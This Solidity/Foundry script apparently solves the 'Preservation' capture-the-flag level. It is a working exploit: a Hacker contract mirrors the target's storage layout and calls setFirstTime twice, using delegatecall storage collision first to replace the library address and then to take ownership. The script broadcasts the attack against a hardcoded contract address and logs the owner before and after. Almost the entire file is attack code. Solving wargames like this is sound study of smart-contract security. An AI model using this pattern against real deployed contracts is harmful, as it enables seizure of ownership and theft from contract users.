// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";

contract Hacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}

contract PreservationSolution is Script {
    Preservation public instance = Preservation(0x2f9Cd30aEe0Cb825D91650d59097E471BE6A26b3);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", instance.owner());
        Hacker hacker = new Hacker();
        hacker.attack(instance);
        console.log("Owner after: ", instance.owner());
        vm.stopBroadcast();
    }
}
